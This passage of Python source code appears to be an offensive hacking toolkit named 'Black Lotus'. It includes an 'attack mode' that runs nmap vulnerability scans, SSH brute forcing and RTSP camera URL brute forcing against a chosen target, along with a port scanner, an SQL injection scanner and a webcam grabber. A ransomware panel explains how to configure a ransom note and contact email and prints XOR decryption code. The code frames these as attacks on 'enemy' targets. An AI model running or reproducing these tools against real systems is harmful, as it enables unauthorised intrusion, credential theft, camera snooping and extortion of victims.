    regex = ("^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$")
    from urllib.request import urlopen
    os.system('cls||clear')
    print("""\033[37m
=============================================
\033[32m
 ██████╗███╗   ██╗██╗██████╗ ███████╗██████╗ 
██╔════╝████╗  ██║██║██╔══██╗██╔════╝██╔══██╗
███████╗██╔██╗ ██║██║██████╔╝█████╗  ██████╔╝
╚════██║██║╚██╗██║██║██╔═══╝ ██╔══╝  ██╔══██╗
███████║██║ ╚████║██║██║     ███████╗██║  ██║
╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
    $\033[37mBy Th3 Jes7er
\033[37m=============================================""")
    target = input("\033[37mEnter Target \033[32mIp Address\033[37m/\033[32mHostname \033[32m> \033[37m")
    if(re.search(regex, target)):
        ip_addr = target
    else:
        ip_addr = socket.gethostbyname(target)
    url = 'http://ipinfo.io/' + str(ip_addr) + '/json'
    response = urlopen(url)
    data = json.load(response)

    ip=data['ip']
    org=data['org']
    city = data['city']
    country=data['country']
    region=data['region']
    location=data['loc']
    hostname=data['hostname']

    print('\033[37mIP: \033[32m', ip, '\033[37m\nRegion: \033[32m', region, '\033[37m\nCountry: \033[32m',country, '\033[37m\nCity: \033[32m',city, '\033[37m\nOrg: \033[32m', org, '\033[37m ')
    print('\033[37mLocation: \033[32m', location)
    print('\033[37mHostname: \033[32m', hostname)
    print("\n\033[37m")
    a = input("\033[37m[\033[32m+\033[37m]\033[37mEnter attack mode? \033[37m(\033[32my\033[37m/\033[32mn\033[37m) \033[32m> ")
    if a == "n":
        print("\033[37m[\033[33m!\033[37m]Attack Mode Aborted!")
        sys.exit()
    elif a == "y":
        print("\033[37m[\033[32m*\033[37m]Loading Modules")
        import time
        animation = ["[\033[32m###         \033[37m]","[\033[32m####        \033[37m]", "[\033[32m#####       \033[37m]", "[\033[32m######      \033[37m]", "[\033[32m#######     \033[37m]", "[\033[32m########    \033[37m]", "[\033[32m#########   \033[37m]", "[\033[32m##########  \033[37m]", "[\033[32m########### \033[37m]", "[\033[32m############\033[37m]"]
        for i in range(len(animation)):
            time.sleep(0.2)
            sys.stdout.write("\r" + animation[i % len(animation)])
            sys.stdout.flush()
        print("\n")
        attack_mode = True
        print("Use 'help' to see commands")
        option1 = 0
        option_1 = ' '
        option2 = ' '
        option_2 = ' '
        module_b = str('\033[32m> ')
        module_error = ' '
        while attack_mode:
            b = input("\033[37m[\033[32m*\033[37m]Attack Mode {}".format(module_b))
            if b == "use scanner/open_ports":
                module_name = 'scanner/open_ports'
                option1 = ip_addr
                option_1 = "Your Remote Target"
                option2 = 'exploit'
                option_2 = "Start the Scanner"
                module_b = '(\033[32mscanner\033[37m/\033[32mopen_ports\033[37m)\033[32m> '
                print("\033[37m[\033[32m*\033[37m]Scanner Module '\033[32m", module_name, "\033[37m' Insercted!")
                command = str("nmap -sV -Pn " + option1)
                module_info = "Reveal open ports of the target ip"
                module_error = "\033[37m[\033[33m*\033[37mTarget is blocking the scan or your firewall doesnt allow connection to specific ports"
                
            elif b == "use scanner/vuln":
                module_name = 'scanner/vuln'
                option1 = ip_addr
                option_1 = "Your Remote Target"
                option2 = 'exploit'
                option_2 = "Start the Scanner"
                module_b = '(\033[32mscanner\033[37m/\033[32mvuln\033[37m)\033[32m> '
                print("\033[37m[\033[32m*\033[37m]Scanner Module '\033[32m", module_name, "\033[37m' Insercted!")
                command = str("nmap -Pn -sV --script vuln " + option1)
                module_info = "Dig vulnerabilities about your target"
                module_error = "\033[37m[\033[33m*\033[37mTarget is blocking the scan or your firewall doesnt allow connection to specific ports"
                
            elif b == "use scanner/http_info":
                module_name = 'scanner/http_info'
                option1 = ip_addr
                option_1 = "Your Remote Target"
                option2 = 'exploit'
                option_2 = "Start the Scanner"
                module_b = '(\033[32mscanner\033[37m/\033[32mhttp_info\033[37m)\033[32m> '
                print("\033[37m[\033[32m*\033[37m]Scanner Module '\033[32m", module_name, "\033[37m' Insercted!")
                command = str("nmap -Pn -p80 --script http-grep " + option1)
                module_info = "Return the e-mail and IP addresses found on all subpages discovered"
                module_error = "\033[37m[\033[33m*\033[37mNot a Website"
            
            elif b == "use bruteforce/ssh_brute":
                module_name = 'bruteforce/ssh_brute'
                option1 = ip_addr
                option_1 = "Your Remote Target"
                option2 = 'exploit'
                option_2 = "Start the Scanner"
                module_b = '(\033[32mbruteforce\033[37m/\033[32mssh_brute\033[37m)\033[32m> '
                print("\033[37m[\033[32m*\033[37m]Bruteforce Module '\033[32m", module_name, "\033[37m' Insercted!")
                command = str("nmap -Pn -p22 --script ssh-brute " + option1)
                module_info = "Break target ssh service"
                module_error = "\033[37m[\033[33m*\033[37mPort 22 is not open or it's blocking the attack"
            
            elif b == "use bruteforce/dns_brute":
                module_name = 'bruteforce/dns_brute'
                option1 = ip_addr
                option_1 = "Your Remote Target"
                option2 = 'exploit'
                option_2 = "Start the Scanner"
                module_b = '(\033[32mbruteforce\033[37m/\033[32mdns_brute\033[37m)\033[32m> '
                print("\033[37m[\033[32m*\033[37m]Bruteforce Module '\033[32m", module_name, "\033[37m' Insercted!")
                command = str("nmap -Pn -p 80,443 --script dns-brute " + option1)
                module_info = "Bruteforce for dns servers"
                module_error = "\033[37m[\033[33m*\033[37mNot a webserver"
            
            elif b == "use enumeration/rtsp_cam":
                module_name = 'enumeration/rtsp_cam'
                option1 = ip_addr
                option_1 = "Your Remote Target"
                option2 = 'exploit'
                option_2 = "Start the Scanner"
                module_b = '(\033[32menumeration\033[37m/\033[32mrtsp_cam\033[37m)\033[32m> '
                print("\033[37m[\033[32m*\033[37m]Enumeration Module '\033[32m", module_name, "\033[37m' Insercted!")
                command = str("nmap -Pn --script rtsp-url-brute -p 554 " + option1)
                module_info = "Enumerate RTSP Camera media URLS"
                module_error = "\033[37m[\033[33m*\033[37mTarget does not have a ip camera"
            
            elif b == "use enumeration/http_dir":
                module_name = 'enumeration/http_dir'
                option1 = ip_addr
                option_1 = "Your Remote Target"
                option2 = 'exploit'
                option_2 = "Start the Scanner"
                module_b = '(\033[32menumeration\033[37m/\033[32mhttp_dir\033[37m)\033[32m> '
                print("\033[37m[\033[32m*\033[37m]Enumeration Module '\033[32m", module_name, "\033[37m' Insercted!")
                command = str("nmap -Pn --script http-enum -p 80,443 " + option1)
                module_info = "Enumerate Website Directories"
                module_error = "\033[37m[\033[33m*\033[37mNot a webserver"
            
            
            elif b == "help":
                print("""\033[32m
 $\033[37mGeneral
 \033[32mshow modules\033[37m        show available modules
 \033[32muse module_name\033[37m     use specific module
 \033[32mshow options\033[37m        see specific module options
 \033[32mexploit\033[37m             run the attack
 """)
            elif b == "show modules":
                print("""\033[32m
 $\033[37mModules
 Recon\033[32m:
 \033[37m[\033[32m+\033[37m] scanner/open_ports
 \033[37m[\033[32m+\033[37m] scanner/vuln
 \033[37m[\033[32m+\033[37m] scanner/http_info
 
 Bruteforce\033[32m:
 \033[37m[\033[32m+\033[37m] bruteforce/ssh_brute
 \033[37m[\033[32m+\033[37m] bruteforce/dns_brute
 
 Enumeration\033[32m:
 \033[37m[\033[32m+\033[37m] enumeration/rtsp_cam
 \033[37m[\033[32m+\033[37m] enumeration/http_dir
 
 More coming soon """)
            elif b == "show options":
                print("\n\033[37mModule \033[32m", module_name, "\033[37m information:")
                print(module_info)
                print("\033[37mOPTIONS PANEL \033[32m>>>>>>>>>>>>>>>>>>>>>>>>\033[37m")
                print(" \033[32m$\033[37m", option1, "   ", option_1)
                print("    ")
                print(" \033[32m$\033[37m", option2, "   ", option_2)
                print("\nTo refresh your options panel, type 'show options' ")
            elif b == "clear":
                os.system('clear')
            elif b == "exit":
                sys.exit()
            elif b == "exploit":
                print("\033[37m[\033[32m*\033[37m]Trying to attack \033[32m", hostname, "\033[37m ...")
                print("\033[37m[\033[32m*\033[37m]Press Ctrl + C to Abort")
                try:
                    os.system(command)
                except:
                    print("\033[37m[\033[33m!\033[37m]Unable to Attack Target")
                    print(module_error)
                    print("\033[37m[\033[33m!\033[37m]ABORTING!!!")
            else:
                print(b, " not recognized as an internal or external command")
                print("Use 'help' to see the command list")
         

#----------------------------------------------------------------------------------------------------------------------

def text_editor():
  from tkinter import messagebox
  from tkinter import filedialog
  class TextEditor:
    def __init__(self,root):
      self.root = root
      self.root.title("BLACK LOTUS TEXT EDITOR")
      self.root.geometry("1000x500+200+150")
      self.filename = None
      self.title = StringVar()
      self.status = StringVar()
      self.titlebar = Label(self.root,textvariable=self.title,font=("monospace",12,"bold"),bg="black",fg="red",activebackground="cyan",bd=2,relief=GROOVE)
      self.titlebar.pack(side=TOP,fill=BOTH)
      self.settitle()
      self.statusbar = Label(self.root,textvariable=self.status,font=("monospace",10),bg="black",fg="red",bd=2,relief=GROOVE)
      self.statusbar.pack(side=BOTTOM,fill=BOTH)
      self.status.set("Create programs, make the next hacking tool...")
      self.menubar = Menu(self.root,font=("monospace",10,"bold"),bg="black",fg="red",activebackground="white")
      self.root.config(menu=self.menubar)
      self.filemenu = Menu(self.menubar,font=("monospace",10,"bold"),bg="black",fg="red",activebackground="white",tearoff=0)
      self.filemenu.add_command(label="New",accelerator="Ctrl+N",command=self.newfile)
      self.filemenu.add_command(label="Open",accelerator="Ctrl+O",command=self.openfile)
      self.filemenu.add_command(label="Save",accelerator="Ctrl+S",command=self.savefile)
      self.filemenu.add_command(label="Save As",accelerator="Ctrl+A",command=self.saveasfile)
      self.filemenu.add_separator()
      # Adding Exit window Command
      self.filemenu.add_command(label="Exit",accelerator="Ctrl+E",command=self.exit)
      # Cascading filemenu to menubar
      self.menubar.add_cascade(label="File", menu=self.filemenu)
      # Creating Edit Menu
      self.editmenu = Menu(self.menubar,font=("monospace",10,"bold"),bg="black",fg="red",activebackground="white",tearoff=0)
      # Adding Cut text Command
      self.editmenu.add_command(label="Cut",accelerator="Ctrl+X",command=self.cut)
      # Adding Copy text Command
      self.editmenu.add_command(label="Copy",accelerator="Ctrl+C",command=self.copy)
      # Adding Paste text command
      self.editmenu.add_command(label="Paste",accelerator="Ctrl+V",command=self.paste)
      # Adding Seprator
      self.editmenu.add_separator()
      # Adding Undo text Command
      self.editmenu.add_command(label="Undo",accelerator="Ctrl+U",command=self.undo)
      # Cascading editmenu to menubar
      self.menubar.add_cascade(label="Edit", menu=self.editmenu)
      # Creating Help Menu
      self.helpmenu = Menu(self.menubar,font=("monospace",10,"bold"),bg="black",fg="red",activebackground="white",tearoff=0)
      # Adding About Command
      self.helpmenu.add_command(label="About",command=self.infoabout)
      # Cascading helpmenu to menubar
      self.menubar.add_cascade(label="Help", menu=self.helpmenu)
      # Creating Scrollbar
      scrol_y = Scrollbar(self.root,orient=VERTICAL)
      # Creating Text Area
      self.txtarea = Text(self.root,yscrollcommand=scrol_y.set,font=("monospace",15,"bold"),bg="black",fg="red",insertbackground="white",state="normal",relief=GROOVE)
      # Packing scrollbar to root window
      scrol_y.pack(side=RIGHT,fill=Y)
      # Adding Scrollbar to text area
      scrol_y.config(command=self.txtarea.yview)
      # Packing Text Area to root window
      self.txtarea.pack(fill=BOTH,expand=1)
      # Calling shortcuts funtion
      self.shortcuts()
    # Defining settitle function
    def settitle(self):
      # Checking if Filename is not None
      if self.filename:
        # Updating Title as filename
        self.title.set(self.filename)
      else:
        # Updating Title as Untitled
        self.title.set("Untitled")
    # Defining New file Function
    def newfile(self,*args):
      # Clearing the Text Area
      self.txtarea.delete("1.0",END)
      # Updating filename as None
      self.filename = None
      # Calling settitle funtion
      self.settitle()
      # updating status
      self.status.set("New File Created")
    # Defining Open File Funtion
    def openfile(self,*args):
      # Exception handling
      try:
        # Asking for file to open
        self.filename = filedialog.askopenfilename(title = "Select file",filetypes = (("All Files","*.*"),("Text Files","*.txt"),("Python Files","*.py"),("Bat Files","*.bat"),("Executables","*.exe"),("Android Apps","*.apk")))
        # checking if filename not none
        if self.filename:
          # opening file in readmode
          infile = open(self.filename,"r")
          # Clearing text area
          self.txtarea.delete("1.0",END)
          # Inserting data Line by line into text area
          for line in infile:
            self.txtarea.insert(END,line)
          # Closing the file
          infile.close()
          # Calling Set title
          self.settitle()
          # Updating Status
          self.status.set("Opened Successfully")
      except Exception as e:
        messagebox.showerror("Exception",e)
    # Defining Save File Funtion
    def savefile(self,*args):
      # Exception handling
      try:
        # checking if filename not none
        if self.filename:
          # Reading the data from text area
          data = self.txtarea.get("1.0",END)
          # opening File in write mode
          outfile = open(self.filename,"w")
          # Writing Data into file
          outfile.write(data)
          # Closing File
          outfile.close()
          # Calling Set title
          self.settitle()
          # Updating Status
          self.status.set("Saved Successfully")
        else:
          self.saveasfile()
      except Exception as e:
        messagebox.showerror("Exception",e)
    # Defining Save As File Funtion
    def saveasfile(self,*args):
      # Exception handling
      try:
        # Asking for file name and type to save
        untitledfile = filedialog.asksaveasfilename(title = "Save file As",defaultextension=".txt",initialfile = "Untitled.txt",filetypes = (("All Files","*.*"),("Text Files","*.txt"),("Python Files","*.py"),("Bat Files","*.bat"),("Executables","*.exe"),("Android Apps","*.apk")))
        # Reading the data from text area
        data = self.txtarea.get("1.0",END)
        # opening File in write mode
        outfile = open(untitledfile,"w")
        # Writing Data into file
        outfile.write(data)
        # Closing File
        outfile.close()
        # Updating filename as Untitled
        self.filename = untitledfile
        # Calling Set title
        self.settitle()
        # Updating Status
        self.status.set("Saved Successfully")
      except Exception as e:
        messagebox.showerror("Exception",e)
    # Defining Exit Funtion
    def exit(self,*args):
      op = messagebox.askyesno("WARNING","Your Unsaved Data May be Lost!!")
      if op>0:
        self.root.destroy()
      else:
        return
    # Defining Cut Funtion
    def cut(self,*args):
      self.txtarea.event_generate("<<Cut>>")
    # Defining Copy Funtion
    def copy(self,*args):
            self.txtarea.event_generate("<<Copy>>")
    # Defining Paste Funtion
    def paste(self,*args):
      self.txtarea.event_generate("<<Paste>>")
    # Defining Undo Funtion
    def undo(self,*args):
      # Exception handling
      try:
        # checking if filename not none
        if self.filename:
          # Clearing Text Area
          self.txtarea.delete("1.0",END)
          # opening File in read mode
          infile = open(self.filename,"r")
          # Inserting data Line by line into text area
          for line in infile:
            self.txtarea.insert(END,line)
          # Closing File
          infile.close()
          # Calling Set title
          self.settitle()
          # Updating Status
          self.status.set("Undone Successfully")
        else:
          # Clearing Text Area
          self.txtarea.delete("1.0",END)
          # Updating filename as None
          self.filename = None
          # Calling Set title
          self.settitle()
          # Updating Status
          self.status.set("Undone Successfully")
      except Exception as e:
        messagebox.showerror("Exception",e)
    # Defining About Funtion
    def infoabout(self):
      messagebox.showinfo("Black Lotus Text Editor","offers integrated text editor for our hackers!\nEnjoy writting your next virus!")
    # Defining shortcuts Funtion
    def shortcuts(self):
      # Binding Ctrl+n to newfile funtion
      self.txtarea.bind("<Control-n>",self.newfile)
      # Binding Ctrl+o to openfile funtion
      self.txtarea.bind("<Control-o>",self.openfile)
      # Binding Ctrl+s to savefile funtion
      self.txtarea.bind("<Control-s>",self.savefile)
      # Binding Ctrl+a to saveasfile funtion
      self.txtarea.bind("<Control-a>",self.saveasfile)
      # Binding Ctrl+e to exit funtion
      self.txtarea.bind("<Control-e>",self.exit)
      # Binding Ctrl+x to cut funtion
      self.txtarea.bind("<Control-x>",self.cut)
      # Binding Ctrl+c to copy funtion
      self.txtarea.bind("<Control-c>",self.copy)
      # Binding Ctrl+v to paste funtion
      self.txtarea.bind("<Control-v>",self.paste)
      # Binding Ctrl+u to undo funtion
      self.txtarea.bind("<Control-u>",self.undo)
  # Creating TK Container
  root = Tk()
  # Passing Root to TextEditor Class
  TextEditor(root)
  # Root Window Looping
  root.mainloop()

#----------------------------------------------------------------------------------------------------------------------

def wipp():
    import tkinterweb
    import tkinter as tk
    root = tk.Tk()
    root.title("Black Lotus Browser: Wireless Network Mapping")
    root.geometry("900x450+200+150")
    frame = tkinterweb.HtmlFrame(root)
    frame.load_website('https://www.wigle.net/')
    frame.pack(fill="both", expand=True)
    root.mainloop()
    print("If browser did not work, go here > https://www.wigle.net/")

#----------------------------------------------------------------------------------------------------------------------

def observer():
    #!/usr/bin/env python3
    #Viking v1-dev-
    #Copyright of Th3 Jes7er
    def startup():
        import os
        os.system('cls||clear')
        banner =(r"""
                                         `-.`'.-'
                                      `-.        .-'.
                                   `-.    -./\.-    .-'
                                       -.  /_|\  .-
                                   `-.   `/____\'   .-'.
                                `-.    -./.-""-.\.-      '
                                   `-.  /< (()) >\  .-'
                                 -   .`/__`-..-'__\'   .-
                               ,...`-./___|____|___\.-'.,.
                                  ,-'   ,` . . ',   `-,
                               ,-'   ________________  `-,
                                   ,'/____|_____|_____\
                                  / /__|_____|_____|___\          ( \  /(
            )\  / )              / /|_____|_____|_____|_\          ) ) \ \
           / / ( (              ' /____|_____|_____|_____\        / /   | |
          | |   \ \           .' /__|_____|_____|_____|___\      / /    / /.-.
       .-.\ \    \ \         ,' /|_____|_____|_____|_____|_\     | `._.' /(  =)
      (=  )\ `._.' |         ````````````````````````````````    (       (_) /
             `----'____  _                                         `----'
                  / __ \| | By Th3 Jes7er         $ ADVANCED NETWORK SCANNER
                 | |  | | |__  ___  ___ _ ____   _____ _ __
                 | |  | | '_ \/ __|/ _ \ '__\ \ / / _ \ '__|
                 | |__| | |_) \__ \  __/ |   \ V /  __/ |
                  \____/|_.__/|___/\___|_|    \_/ \___|_|   -v1-""")
        print("\033[32m", banner)
        observer = True
        from datetime import datetime
        import socket
        import threading
        import os
        import platform

        def icmp_scan():
            from datetime import datetime
            net = input("Enter the Network Address: ")
            net1= net.split('.')
            a = '.'

            net2 = net1[0] + a + net1[1] + a + net1[2] + a
            st1 = int(input("Enter the Starting Number: "))
            en1 = int(input("Enter the Last Number: "))
            en1 = en1 + 1
            oper = platform.system()

            if (oper == "Windows"):
                ping1 = "ping -n 1 "
            elif (oper == "Linux"):
                ping1 = "ping -c 1 "
            else :
                ping1 = "ping -c 1 "
            t1 = datetime.now()
            print ("Scanning in Progress:")

            for ip in range(st1,en1):
                addr = net2 + str(ip)
                comm = ping1 + addr
                response = os.popen(comm)

            for line in response.readlines():
                if(line.count("TTL")):
                    break
                if (line.count("TTL")):
                    print (addr, "--> Live")

            t2 = datetime.now()
            total = t2 - t1
            print ("Scanning completed in: ",total)

        def main_scan():
            addr = socket.gethostbyname(input("\n\n\033[32mObserver(\033[33mtarget/hostname\033[32m) > "))
            start_port = 0
            port_end_if = input("\033[32mObserver(\033[33mregular/full\033[32m) > ")
            if port_end_if == "regular":
                end_port = int(1024)
            elif port_end_if == "full":
                end_port = int(65535)
            else:
                pass
            print("\nScanning Target: "+ str(addr))
            print("|_IP ADDRESS\tPORT\tSTATE\tSERVICE\tHOSTNAME")

            def scanport(addr, port):
                socket_obj = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                result = socket_obj.connect_ex((addr,port))
                socket_obj.close()

                if result == 0:
                    machine_hostname = socket.gethostbyaddr(addr)[0]
                    service = socket.getservbyport(port)
                    print("| " + str(addr) + " \t" + str(port) + "\topen" +" \t"+ str(service) + " \t" + str(machine_hostname))
                    return port
                else:
                    return None


            def bannergrabbing(addr, port):
                print("Gettig service information for port: ", port)
                bannergrabber = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                socket.setdefaulttimeout(2)
                try:
                    bannergrabber.connect((addr, port))
                    bannergrabber.send('WhoAreYou\r\n')
                    banner = bannergrabber.recv(100)
                    bannergrabber.close()
                    print (banner, "\n")
                except:
                    print("Cannot connect to port ", port)


            def portscanner(address, start, end):
                open_ports = []
                # scan port range for host
                for port in range(start_port, end_port):
                    open_port = scanport(addr, port)
                    if open_port is None:
                        continue
                    else:
                        open_ports.append(open_port)
                return open_ports

            def get_service_banners_for_host(address, portlist):
                for port in portlist:
                    bannergrabbing(addr, port)

            if __name__=='__main__':
                open_ports = portscanner(addr, start_port, end_port)
                get_service_banners_for_host(addr, open_ports)
        def tcp_scan():
            import socket
            from datetime import datetime
            net = input("Enter the IP address: ")
            net1 = net.split('.')
            a = '.'

            net2 = net1[0] + a + net1[1] + a + net1[2] + a
            st1 = int(input("Enter the Starting Number: "))
            en1 = int(input("Enter the Last Number: "))
            en1 = en1 + 1
            t1 = datetime.now()

            def scan(addr):
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                result = s.connect_ex((addr,135))
                if result == 0:
                    return 1
                else :
                    return 0

            def run1():
                for ip in range(st1,en1):
                    addr = net2 + str(ip)
                    if (scan(addr)):
                        print (addr , "is live")

            run1()
            t2 = datetime.now()
            total = t2 - t1
            print("Scan completed in '", total, "'")

        print("""
\033[32m[\033[33m1\033[37m] ICMP SCAN (ping sweep)
\033[32m[\033[33m2\033[37m] TCP Discover UP target machines
\033[32m[\033[33m3\033[37m] Scan a remote host for open ports and fingerprints
        """)
        observer_scan = input("\033[32mEnter choice > ")
        if observer_scan == "1":
            icmp_scan()
        elif observer_scan == "2":
            tcp_scan()
        elif observer_scan == "3":
            main_scan()
        else:
            pass
    startup()

#----------------------------------------------------------------------------------------------------------------------

def webcam_opener():
    import cv2
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        raise IOError("Cannot open webcam")

    while True:
        ret, frame = cap.read()
        frame = cv2.resize(frame, None, fx=0.5, fy=0.5, interpolation=cv2.INTER_AREA)
        cv2.imshow('Black Lotus camera', frame)
        c = cv2.waitKey(1)
        if c == 27:
            break

    cap.release()
    cv2.destroyAllWindows()

#----------------------------------------------------------------------------------------------------------------------

def ransomware_instructions():
    os.system("cls || clear")
    print("""
\033[31mRansomware instructions Panel\033[37m

The infected file is called '\033[31mransomware.py\033[37m'
It's located in the same folder of Black Lotus
1) Open The file and edit the enemy file you want to encrypt
2) Under the '\033[33mATTACK MESSAGE\033[37m' section you have 3 options:
   |_1) Change the txt file name ( Default = 'YOU_ARE_FUCKED')
            |_\033[31mDONT CHANGE THE FILE TYPE \033[37m( DEFAULT '.txt')
   |_2) Change the contact form with an email of your choice
   |_3) Change the email name if you want( Default = 'HELP ME')

To Undo the encryption run this script (only the yellow code) :

---------------------------------------------------------- """)
    print("\033[33m")
    print("""
#!/usr/bin/python
# Ransomware Antidote By The Jes7er

import os
try:
    from Crypto.Cipher import XOR
except:
    os.system('pip install pycrypto')
import base64
import sys

key = 'matrix'
cipher = XOR.new(key)
pathfile = 'THE FILE YOU WANT TO DECRYPT'
openfile = open(pathfile, 'rb')
readfile = openfile.read()
openfile.close()
encoding = cipher.decrypt(base64.b64decode(readfile))
os.system('rm '+ pathfile)
openfile2 = open(pathfile,'wb')
openfile2.write(encoding)
openfile2.close()
""")
    print("""\033[37m------------------------------------------------------------

save this file after the modification as '\033[32mdecryption.py\033[37m'
run it by typing '\033[31mpython3 decryption.py\033[37m'
\n\033[31mREAD FROM THE BEGINNING ^ \033[37m""")

#----------------------------------------------------------------------------------------------------------------------

def updatesystem():
    import os
    print("\033[31mBlack Lotus is doing some updates for you")
    print("This may take a while.. Grab a coffee\033[37m ")
    os.system("sudo apt-get update -y && sudo apt-get upgrade -y")

#----------------------------------------------------------------------------------------------------------------------

def meg_sql_scan():
  import requests
  from bs4 import BeautifulSoup as bs
  from urllib.parse import urljoin
  from pprint import pprint
  logo = ("""\033[37m
  [ \033[31mBlack Lotus SQL Injection Scanner\033[37m ]
            |
  |_________|--------=-----------.
  |_________|| | | |=| \033[33m ////////\033[37m |%%========-\033[37m
  |         |--------=-----------`
            |

  """)
  # initialize an HTTP session & set the browser
  s = requests.Session()
  s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

  def get_all_forms(url):
      """Given a `url`, it returns all forms from the HTML content"""
      soup = bs(s.get(url).content, "html.parser")
      return soup.find_all("form")


  def get_form_details(form):
      """
      This function extracts all possible useful information about an HTML `form`
      """
      details = {}
      # get the form action (target url)
      try:
          action = form.attrs.get("action").lower()
      except:
          action = None
      # get the form method (POST, GET, etc.)
      method = form.attrs.get("method", "get").lower()
      # get all the input details such as type and name
      inputs = []
      for input_tag in form.find_all("input"):
          input_type = input_tag.attrs.get("type", "text")
          input_name = input_tag.attrs.get("name")
          input_value = input_tag.attrs.get("value", "")
          inputs.append({"type": input_type, "name": input_name, "value": input_value})
      # put everything to the resulting dictionary
      details["action"] = action
      details["method"] = method
      details["inputs"] = inputs
      return details

  def is_vulnerable(response):
      """A simple boolean function that determines whether a page
      is SQL Injection vulnerable from its `response`"""
      errors = {
          # MySQL
          "you have an error in your sql syntax;",
          "warning: mysql",
          # SQL Server
          "unclosed quotation mark after the character string",
          # Oracle
          "quoted string not properly terminated",
      }
      for error in errors:
          # if you find one of these errors, return True
          if error in response.content.decode().lower():
              return True
      # no error detected
      return False

  def scan_sql_injection(url):
      # test on URL
      for c in "\"'":
          # add quote/double quote character to the URL
          new_url = f"{url}{c}"
          print("[\033[33m!\033[37m] Trying", new_url)
          # make the HTTP request
          res = s.get(new_url)
          if is_vulnerable(res):
              # SQL Injection detected on the URL itself,
              # no need to preceed for extracting forms and submitting them
              print("[\033[31m+\033[37m] SQL Injection vulnerability detected, link:", new_url)
              return
      # test on HTML forms
      forms = get_all_forms(url)
      print(f"[\033[31m+\033[37m] Detected {len(forms)} forms on {url}.")
      for form in forms:
          form_details = get_form_details(form)
          for c in "\"'":
              # the data body we want to submit
              data = {}
              for input_tag in form_details["inputs"]:
                  if input_tag["type"] == "hidden" or input_tag["value"]:
                      # any input form that is hidden or has some value,
                      # just use it in the form body
                      try:
                          data[input_tag["name"]] = input_tag["value"] + c
                      except:
                          pass
                  elif input_tag["type"] != "submit":
                      # all others except submit, use some junk data with special character
                      data[input_tag["name"]] = f"test{c}"
              # join the url with the action (form request URL)
              url = urljoin(url, form_details["action"])
              if form_details["method"] == "post":
                  res = s.post(url, data=data)
              elif form_details["method"] == "get":
                  res = s.get(url, params=data)
              # test whether the resulting page is vulnerable
              if is_vulnerable(res):
                  print("[\033[31m+\033[37m] SQL Injection vulnerability detected, link: ", url)
                  print("[\033[31m+\033[37m] Form:")
                  pprint(form_details)
                  break

  if __name__ == "__main__":
    print(logo)
    url = input("Enter URL > ")
    #http://testphp.vulnweb.com/artists.php?artist=1
    scan_sql_injection(url)

#----------------------------------------------------------------------------------------------------------------------
def cve_search():
    cve = input("Enter cve name \033[5;31m|> \033[0;37m")
    url = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name='
    url = str(url + cve)
    print("\033[37mVisit this url to get complete information > \033[31m", url, "\033[37m")

#----------------------------------------------------------------------------------------------------------------------

def steganography_meg():
    import cv2
    import numpy as np

    def to_bin(data):
        """Convert `data` to binary format as string"""
        if isinstance(data, str):
            return ''.join([ format(ord(i), "08b") for i in data ])
        elif isinstance(data, bytes) or isinstance(data, np.ndarray):
            return [ format(i, "08b") for i in data ]
        elif isinstance(data, int) or isinstance(data, np.uint8):
            return format(data, "08b")
        else:
            raise TypeError("Type not supported.")

    def encode(image_name, secret_data):
        # read the image
        image = cv2.imread(image_name)
        # maximum bytes to encode
        n_bytes = image.shape[0] * image.shape[1] * 3 // 8
        print("[*] Maximum bytes to encode:", n_bytes)
        if len(secret_data) > n_bytes:
            raise ValueError("[!] Insufficient bytes, need bigger image or less data.")
        print("[*] Encoding data...")
        # add stopping criteria
        secret_data += "====="
        data_index = 0
        # convert data to binary
        binary_secret_data = to_bin(secret_data)
        # size of data to hide
        data_len = len(binary_secret_data)
        for row in image:
            for pixel in row:
                # convert RGB values to binary format
                r, g, b = to_bin(pixel)
                # modify the least significant bit only if there is still data to store
                if data_index < data_len:
                    # least significant red pixel bit
                    pixel[0] = int(r[:-1] + binary_secret_data[data_index], 2)
                    data_index += 1
                if data_index < data_len:
                    # least significant green pixel bit
                    pixel[1] = int(g[:-1] + binary_secret_data[data_index], 2)
                    data_index += 1
                if data_index < data_len:
                    # least significant blue pixel bit
                    pixel[2] = int(b[:-1] + binary_secret_data[data_index], 2)
                    data_index += 1
                # if data is encoded, just break out of the loop
                if data_index >= data_len:
                    break
        return image

    def decode(image_name):
        print("[+] Decoding...")
        # read the image
        image = cv2.imread(image_name)
        binary_data = ""
        for row in image:
            for pixel in row:
                r, g, b = to_bin(pixel)
                binary_data += r[-1]
                binary_data += g[-1]
                binary_data += b[-1]
        # split by 8-bits
        all_bytes = [ binary_data[i: i+8] for i in range(0, len(binary_data), 8) ]
        # convert from bits to characters
        decoded_data = ""
        for byte in all_bytes:
            decoded_data += chr(int(byte, 2))
            if decoded_data[-5:] == "=====":
                break
        return decoded_data[:-5]

    if __name__ == "__main__":
        input_image = input("Enter Image path > ")
        output_image = input("Enter Output path > ")
        secret_data = input("Enter Message to hidde > ")
        # encode the data into the image
        encoded_image = encode(image_name=input_image, secret_data=secret_data)
        # save the output image (encoded image)
        cv2.imwrite(output_image, encoded_image)
        # decode the secret data from the image
        decoded_data = decode(output_image)
        print("[+] Decoded data:", decoded_data)

#----------------------------------------------------------------------------------------------------------------------

def fake_wifi_access_point():
    #sudo apt-get install aircrack-ng
    import os
    os.system('cls||clear')
    print("""\033[37m
                   .&&&&&@&&&&&&&&&&&&&@&&&&%
             @@@&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&@@
        @&&&&&&&&&&&&&&&&&&@@&&&&&&&&&&&&&&&&&&&&&&&&@@@%
    %&&&&&&&&&&@&&#                          .&&@&&&&&&&&&&&/
 &@&&&&&&&@&@                                      .&&&&&&&&&&&#
@&&&&&&&@                 (@@&&&&&&&@@/                 &&&&&&&&*
   &&&            %&@&&&&&&&&&&&&&&&&&&&&&&&@&/            &@&
